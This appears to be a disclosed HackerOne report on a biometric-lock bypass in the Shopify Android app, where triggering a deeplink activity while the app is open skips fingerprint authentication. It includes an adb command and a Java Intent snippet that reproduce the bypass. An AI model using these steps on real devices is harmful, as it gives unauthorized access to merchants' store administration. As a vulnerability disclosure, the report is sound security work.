# Bypass of biometrics security functionality is possible in Android application (com.shopify.mobile)

## Report Details
- **Report ID**: 637194
- **URL**: https://hackerone.com/reports/637194
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-07-07T15:03:49.294Z
- **Disclosed**: 2019-08-14T13:08:47.279Z

## Reporter
- **Username**: tiago-danin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
# Summary
Shopify Android App has an option to sign in to the app using fingerprint. But if the application was open and someone triggers a "deeplink", authentication is no longer required.

## Step to Reproduce
{F523700}
Link: [Shopify Help Center - Topics - Products](https://help.shopify.com/en/manual/products)

NOTE¹: The application must be **open** when triggered `com.shopify.mobile.lib.app.DeepLinkActivity`.
NOTE²: It is also possible via ADB and Java (Android App):
`adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://www.shopify.com/admin/products'`
```java
Intent intent = new Intent();
intent.setClassName("com.shopify.mobile", "com.shopify.mobile.lib.app.DeepLinkActivity");
intent.setData(Uri.parse("https://www.shopify.com/admin/products")); 
startActivity(intent);
```

My environment information:
{F523698} {F523699}

## Impact

Unauthorized access to use the application.

## Attachments
- Screenshot_2019-07-07-11-07-23-622_com.miui.securitycenter.png
- Screenshot_2019-07-07-11-07-39-629_com.android.settings.png
- Screenrecorder-2019-07-07-10-39-35-272.mp4
